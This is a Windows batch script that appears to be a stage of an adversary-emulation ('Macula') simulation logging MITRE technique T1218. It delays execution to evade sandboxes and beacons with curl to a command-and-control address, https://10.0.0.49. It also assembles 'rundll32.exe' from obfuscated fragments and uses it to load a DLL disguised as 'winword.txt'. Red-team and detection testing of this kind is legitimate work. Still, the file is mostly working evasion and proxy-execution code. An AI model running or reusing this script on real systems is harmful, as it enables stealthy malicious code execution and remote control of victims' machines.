@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8816\8627cace
SET fpakbq=Macula-Stage0-8816
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8816-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=winword.txt
SET fpldhe=8816

REM Log file setup
SET qszwrt=%APPDATA%\!yydue!\macula-simulations.log

REM Initial delay to evade sandbox
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=30s>> "!qszwrt!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=1>> "!qszwrt!" 2>nul

REM Mandatory C2 heartbeat (NOT OBFUSCATED)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=1>> "!qszwrt!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_end=1>> "!qszwrt!" 2>nul

REM Obfuscated LOLBin setup using variable indirection
SET aqwrts=r
SET wxcsdf=u
SET pflkjn=n
SET zxcvbn=d
SET mnbvfd=ll
SET plkiju=32
SET qwedfg=.exe
SET lolpart=!aqwrts!!wxcsdf!!pflkjn!!zxcvbn!!mnbvfd!!plkiju!!qwedfg!

REM Directory change with debug logging
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!qszwrt!" 2>nul
cd /d "!yktnwwf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_end=1>> "!qszwrt!" 2>nul

REM Second delay between operations
ping -n 8 127.0.0.1 >nul

REM Execute obfuscated Rundll32 command with DLL load
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>> "!qszwrt!" 2>nul
SET nptswr=!edjwtl!
SET vcxpqk=,DllMain
SET qwemkh=!nptswr!!vcxpqk!
SET dllexec=!lolpart! !qwemkh!

REM Prepare TTP logging variables
SET ttp_res=1
SET ttp_err=
!dllexec! 2>nul
if errorlevel 1 (
    SET ttp_res=0
    SET ttp_err=execution_failed
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_end=!ttp_res!>> "!qszwrt!" 2>nul

REM Final TTP logging for T1218
SET ttp_time=!DATE! !TIME!
echo [!ttp_time!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_res!:!ttp_err!>> "!qszwrt!" 2>nul

REM Random final delay
SET /A rdelay=%RANDOM% %% 15 + 5
timeout /t !rdelay! /nobreak >nul